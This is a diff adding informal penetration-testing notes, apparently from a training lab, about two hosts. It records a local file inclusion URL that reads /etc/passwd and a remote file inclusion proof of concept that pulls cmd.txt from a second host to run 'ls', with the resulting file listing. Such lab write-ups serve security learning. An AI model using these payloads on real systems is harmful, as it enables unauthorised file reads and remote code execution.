@@ -450,4 +450,37 @@ QUIT
 
 221 Goodbye
 
-#### 
+####  10.11.1.31
+
+sory I Forgot this how to get shell
+
+
+
+#### 10.11.1.35
+
+#### information
+
+#### recon
+
+this is a LFI https://10.11.1.35/section.php?page=/etc/passwd%00 and RFI 
+
+#### poc
+
+https://10.11.1.35/section.php?page=http://10.11.0.104/cmd.txt%00&cmd=ls
+
+'''
+
+```
+alldocs.php
+bobdocs.php
+files
+frame_a.htm
+frame_b.htm
+frame_c.htm
+index.html
+section.php
+```
+
+'''
+
+ 
